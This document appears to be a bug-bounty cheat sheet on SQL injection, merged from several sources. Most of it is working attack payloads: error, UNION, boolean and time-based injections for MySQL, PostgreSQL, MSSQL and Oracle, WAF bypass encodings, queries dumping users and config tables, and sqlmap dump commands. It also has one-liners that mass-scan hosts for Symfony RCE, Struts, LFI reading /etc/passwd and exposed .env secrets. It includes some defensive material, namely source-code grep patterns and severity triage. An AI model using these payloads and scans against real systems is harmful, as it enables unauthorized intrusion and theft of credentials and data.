# SQL INJECTION — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes, telegram-intel, github-x-intel (H1 reports, HolyTips, emadshanab), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Map ALL input surfaces (URL params, POST body, headers, cookies, JSON fields)
[ ] 2. Fingerprint DBMS (tech stack, error messages, timing)
[ ] 3. Test each surface: ERROR → UNION → BOOLEAN → TIME
[ ] 4. WAF bypass if blocked (case, comments, encoding, HPP, charset)
[ ] 5. Prove impact: read one config/credentials table → report
```

---

## DETECTION PAYLOADS (Priority Order)

### Error-Based (Fastest Confirmation)
```bash
# Generic
' OR '1'='1
' UNION SELECT NULL--
'; SELECT 1/0--        # Divide by zero → error confirms SQLi

# MySQL extractvalue (when UNION blocked)
' AND extractvalue(1, concat(0x3a, version()))--

# MSSQL
' AND 1=convert(int, @@version)--

# PostgreSQL
' AND 1=cast(version() as int)--

# Oracle
' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
```

### UNION-Based (Data Extraction)
```bash
# Column count
' ORDER BY 1--  → increment until error
' UNION SELECT NULL,NULL,NULL--  # match column count

# Version + current user (single request)
' UNION SELECT NULL,@@version,NULL--     # MySQL
' UNION SELECT NULL,version(),NULL--     # PostgreSQL
' UNION SELECT NULL,@@version,NULL--     # MSSQL
' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1--  # Oracle

# Dump entire table in one request
# MySQL: GROUP_CONCAT
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='target_db'--
# MSSQL 2017+: STRING_AGG
' UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables WHERE table_schema='target_db'--
# PostgreSQL: STRING_AGG
' UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables WHERE table_schema='target_db'--
# Oracle: LISTAGG
' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM all_tables WHERE owner='TARGET'--
```

### Boolean Blind (When No Output/Error)
```bash
# True/False differential
' AND 1=1--    → normal response
' AND 1=2--    → different response (length, content, status)

# Binary search per character
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)))>100--
```

### Time Blind (Last Resort)
```bash
# MySQL
' AND SLEEP(5)--
' , IF((SELECT 1),SLEEP(5),0))-- -    # INSERT context (balance parens)

# PostgreSQL
' AND pg_sleep(5)--

# MSSQL
' WAITFOR DELAY '0:0:5'--

# Oracle
' AND dbms_pipe.receive_message('a',5)--

# Confirm with SLEEP(2) FIRST — rule out app latency
time curl -s "target.com/?id=1' AND SLEEP(2)--"  # Check ~2s delay
```

---

## WAF BYPASS TECHNIQUES (From ALL Sources)

| Technique | Payload Example | Source |
|-----------|-----------------|--------|
| **Case variation** | `SeLeCt UnIoN FrOm` | web2, waf-bypass-agent |
| **Inline comments** | `SEL/**/ECT`, `UN/**/ION` | web2, telegram, waf-bypass |
| **MySQL version comments** | `/*!50000UNION*/` | web2, telegram |
| **Whitespace alternatives** | `%0a`, `%0b`, `%0c`, `/**/ ` | web2, waf-bypass |
| **Operator substitution** | `OR`→`||`, `=`→`LIKE`, `>`→`GREATEST` | web2 |
| **URL encoding** | `%27%20%4f%52%20%31%3d%31` | waf-bypass |
| **Double URL encoding** | `%2527%2520%254f%2552...` | waf-bypass |
| **Hex encoding** | `0x53454c454354` = SELECT | web2, telegram |
| **CHAR() encoding** | `CONCAT(CHAR(83),CHAR(69)...)` | web2 |
| **HTTP Parameter Pollution** | `?id=1&id=1' OR 1=1--` | web2, HolyTips API checklist |
| **JSON parameter pollution** | `{"id":1,"id":"1' OR 1=1--"}` | HolyTips |
| **Content-Type switching** | `application/xml`, `text/plain` | HolyTips |
| **Protocol downgrade** | `curl -0` (HTTP/1.0), `--http2` | waf-bypass-agent |
| **Chunked transfer** | `Transfer-Encoding: chunked` | waf-bypass-agent |
| **XML/JSON swap** | Submit as XML instead of JSON | waf-bypass-agent |
| **Header smuggling** | `X-Forwarded-For: 1' OR 1=1--` | waf-bypass-agent |
| **UTF-16LE charset** | `Content-Type: text/plain; charset=utf16le` | BugXplorer, web2 (Busboy) |
| **Unicode full-width** | `１２７。０。０。１` (U+FF10+) | web2 |

### AWS WAF Specific
```bash
# Try /**/ between EVERY token
S/**/E/**/L/**/E/**/C/**/T/**/
# Or MySQL version comment + whitespace
/*!50000UNION*/%0aSELECT
```

### ModSecurity Specific
```bash
# Version comment + newline
/*!50000UNION*/%0aSELECT
```

---

## DBMS FINGERPRINTING (Before Blind Testing)

| Tech Signal | DBMS | Blind Probe |
|-------------|------|-------------|
| `.asp`/IIS/ASP.NET | MSSQL | `WAITFOR DELAY '0:0:5'` |
| `.php`/LAMP | MySQL/MariaDB | `SLEEP(5)` |
| Java/Spring, `.jsp` | PG/MSSQL/Oracle | `pg_sleep(5)` / `WAITFOR` / `dbms_pipe.receive_message` |
| Python/Rails | PG/MySQL | `pg_sleep(5)` / `SLEEP(5)` |
| Node.js | PG/MySQL/Mongo | `pg_sleep(5)` / `SLEEP(5)` |
| Go | PG/MySQL | `pg_sleep(5)` / `SLEEP(5)` |

### Version-Specific Payloads
```bash
# MySQL ≥ 5.0
/*!50000SELECT*/ 1--

# PostgreSQL ≥ 9.0
' AND (SELECT 1 FROM pg_sleep(5))=1--

# MSSQL ≥ 2005
' WAITFOR DELAY '0:0:5'--

# Oracle ≥ 10g
' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## ENUMERATION METHODOLOGY (Systematic)

### Phase 1: Confirm Injection & Column Count
```bash
# 1. Force deterministic row (bypass reflection)
' UNION SELECT 'AAA','BBB','CCC'--

# 2. Column count via ORDER BY
' ORDER BY 1--  # success
' ORDER BY 2--  # success
' ORDER BY 3--  # error → 2 columns

# 3. Data type per column
' UNION SELECT 'str',1,1.0--  # test each position
```

### Phase 2: Schema Enumeration (Per Surface!)
```bash
# Current DB
' UNION SELECT NULL,current_database(),NULL--  # PG
' UNION SELECT NULL,database(),NULL--          # MySQL
' UNION SELECT NULL,DB_NAME(),NULL--           # MSSQL

# All databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

# Tables in target DB (CASE SENSITIVE on Linux MySQL!)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--
# → Use HEX() to get exact casing:
' UNION SELECT NULL,HEX(table_name),NULL FROM information_schema.tables WHERE table_schema='target_db'--

# Columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Phase 3: Data Extraction (One Request Per Table)
```bash
# Credentials table
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
' UNION SELECT 1,GROUP_CONCAT(id,':',email,':',password_hash),3 FROM users--

# Config/secrets table
' UNION SELECT 1,GROUP_CONCAT(config_key,':',config_value),3 FROM config--

# All tables data (MySQL)
' UNION SELECT 1,GROUP_CONCAT(table_name,':',column_name),3 FROM information_schema.columns WHERE table_schema='target_db'--
```

---

## INSERT CONTEXT TIME-BASED (Headers → Analytics Logs)

```bash
# User-Agent / Referer / X-Forwarded-For logged via INSERT
# Problem: ' OR SLEEP(5)-- breaks VALUES tuple

# Solution: Balance parentheses
' , IF((SELECT 1),SLEEP(5),0))-- -

# Test with SLEEP(2) first
curl -H "User-Agent: Mozilla', IF((SELECT 1),SLEEP(2),0))-- -" target.com
```

---

## SQLMAP OPTIMIZATION (Manual > Automated for Proof)

```bash
# Force payload shape (bypass reflective detection)
sqlmap -u "https://t/search.php?q=x" --batch \
  --prefix="'" --suffix="-- -" \
  --technique=U  # or B/E/T — target ONE technique

# Orient first
sqlmap ... --current-db
# Then union with exact column count
# ORDER BY 5 → -5 = range(2,6)

# Direct dump (one table)
sqlmap -u "..." -D target_db -T users --dump --batch
```

---

## PROOF EXTRACTION OVER LOSSY CHANNEL (OCR/Screenshot Only)

```bash
# SERVER (remote):
cat /path/flag.csv | tail -1 | tr -d '"\r' | cut -d, -f1 > /tmp/f.txt
md5sum /tmp/f.txt                       # → ABC12DEF... (remote hash)
od -An -tx1 -v /tmp/f.txt               # spaced hex for OCR

# ATTACKER (local):
for c in $(cat candidates.txt); do
  [ "$(printf '%s' "$c" | md5sum | cut -d' ' -f1)" = "ABC12DEF..." ] && echo "MATCH: $c"
done
```

**Rule**: `md5sum` on server + local match = **definitive proof**. Never trust OCR alone.

---

## HIGH-VALUE TARGETS (From 2025 H1 Reports)

| Target | Technique | Bounty | Source |
|--------|-----------|--------|--------|
| MTN Group | SQLi in URL paths | Critical | H1 #2958619 |
| MTN Group | SQL injection in URL path → DB access | Critical | H1 #2633959 |
| MTN Group | OTP code leaked in API response | Critical | H1 #2635315 |
| MTN Group | Ability to add/verify uncontrolled mobile numbers | Critical | H1 #2762462 |
| Django | SQL Injection in FilteredRelation | Critical | H1 #3292573 |
| Django | SQL Injection in Django ORM via `_connector` | Critical | H1 #3335709 |
| Django | SQL injection in JSONField KeyTransform | High | H1 #2588426 |
| Internet Bug Bounty | Apache Airflow SQLi by authenticated user | Low | H1 #3078856 |
| 8x8 | Exposed Google Maps API key | Medium | H1 #3250315 |

---

## CODE GREP PATTERNS (Source Code Review)

```bash
# Python — string concat = vulnerable
grep -rn "execute\|executemany\|raw(" --include="*.py" | grep -v "?"

# Django ORM — raw() or extra()
grep -rn "\.raw(\|\.extra(" --include="*.py"

# JavaScript/Node — string concat in query
grep -rn "\.query(" --include="*.js" --include="*.ts" | grep "\+"
grep -rn "sequelize\.query\|knex\.raw" --include="*.js"

# PHP — variable in raw query
grep -rn "mysql_query\|mysqli_query\|pg_query" --include="*.php" | grep "\$"
grep -rn "PDO.*query\|PDO.*exec" --include="*.php" | grep -v "prepare"

# Java — string concat
grep -rn "createStatement\|executeQuery" --include="*.java" | grep "\+"
grep -rn "jdbcTemplate\.query" --include="*.java" | grep -v "?"

# Go — fmt.Sprintf in query
grep -rn "fmt\.Sprintf.*SELECT\|fmt\.Sprintf.*INSERT" --include="*.go"

# C# — string concat
grep -rn "ExecuteReader\|ExecuteNonQuery" --include="*.cs" | grep "\+"
```

---

## CHAINS THAT PAY (Escalation Paths)

```
Error-based SQLi + readable users table          → Medium (data disclosure)
UNION SQLi + credentials/config table            → High (credential theft)
Boolean blind + admin hash + hashcat crack       → High (ATO)
Time blind + INSERT context (headers)            → Medium (blind extraction)
SQLi → RCE (xp_cmdshell, COPY TO, SELECT INTO)   → Critical (if in scope)
SQLi + SSRF (load_file into OUTFILE)             → Critical
SQLi in password reset → token prediction        → Critical (ATO)
Second-order SQLi (stored → later executed)      → High
```

---

## TRIAGE DECISION TREE

```
1. Does payload reach DB? (error/time/union confirmed)
   NO → Not a bug (WAF blocked, not bypassed)
   YES → Continue

2. Can you read data? (UNION/boolean/time extraction)
   NO → Error-based only, no extraction = Low/Info
   YES → Continue

3. Is data sensitive? (creds, PII, config, tokens)
   NO → Generic data = Low/Medium
   YES → Continue

4. Can you demonstrate REAL impact?
   - Login as another user (hash crack / token reuse)     → Critical
   - Read cloud metadata / internal files                  → Critical
   - Modify data (INSERT/UPDATE/DELETE via SQLi)           → High
   - Chain to RCE (xp_cmdshell, UDF, COPY TO)              → Critical
   - Chain to SSRF (load_file, OUTFILE)                    → Critical
   - Chain to ATO (password reset token, session theft)    → Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| DNS-only callback (no data) | Informational only |
| Error message leak (version only) | No extraction = Low |
| Boolean blind with NO sensitive data found | Low/Info |
| Time blind with NO sensitive data found | Low/Info |
| "Could extract if..." | Theoretical = N/A |
| SQLi in dead code / unused parameter | Not reachable = N/A |
| Stack trace leak without extraction | Info only |

---

## ONE-LINERS (From emadshanab/X)

```bash
# Symfony RCE via PHP credits endpoint
httpx -l hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -mr "PHP Credits"

# Struts S2-016
httpx -l hosts.txt -path /sm/login/loginpagecontentgrabber.do -x GET,POST,PUT -mr "root:x"

# SQLi via app_dev.php
httpx -l hosts.txt -path "/app_dev.php/1'" -x GET --level 4 --risk 2

# LFI at scale (can lead to SQLi via log poisoning)
cat hosts | gau | gf lfi | httpx -paths lfi_wordlist.txt -mr "root:[x*]:0:0:"

# .env exposure (often contains DB credentials)
httpx -l hosts -path /api/.env -mr "APP_SECRET|DB_PASSWORD|DATABASE_URL"
```

---

## HOLYTIPS API SECURITY CHECKLIST (Applied to SQLi)

```
[ ] Test version switching: /api/v3/login → /api/v1/login
[ ] Verb tampering: GET /api/users/1 → POST/PUT/DELETE
[ ] ID wrapping: {"id":111} → {"id":[111]} → {"id":{"id":111}}
[ ] HTTP Parameter Pollution: ?user_id=legit&user_id=victim
[ ] JSON Parameter Pollution: {"user_id":legit,"user_id":victim}
[ ] Wildcard IDs: /api/users/* /api/users/% /api/users/_
[ ] Non-prod environments (staging/qa) — weaker auth/validation
[ ] Content-Type switching: application/xml, text/plain
[ ] Unexpected JSON types: {"username":true}, {"username":null}, {"username":[1]}
```

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `sqlmap` | Automation for structure/dump |
| `waf_encoder.py` | Generate bypass payloads |
| `padbuster` | Padding oracle (if encrypted params) |
| `httpx` | Mass scanning with payloads |
| `nuclei` | Template-based detection |
| `gf` (grep-for) | Pattern extraction (sqli, lfi, etc.) |
| `gau`/`gauplus` | URL discovery from archives |
| `waybackurls` | Historical endpoints |
| `qsreplace` | Query param replacement |
| `ffuf` | Fuzzing with wordlists |
| `nosqlmap` | NoSQL injection (if applicable) |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Sections 7, 420-488 (comprehensive methodology)
- telegram-intel: @bugbountyusa tips #78, #84; @brutsecurity secret regex; @Bug0x writeups
- github-x-intel: ajaysenr/H1 reports (MTN Group, Django, IBB); HolyTips API checklist; emadshanab one-liners
- bountyforge: credential-leak-agent (DB creds), waf-bypass-agent (15 techniques)
- bb-methodology: Tactical Thinking (error diff, env diff, version diff)
- PortSwigger: SQLi cheat sheet, WAF bypass lab
- HackTricks: SQLi per DBMS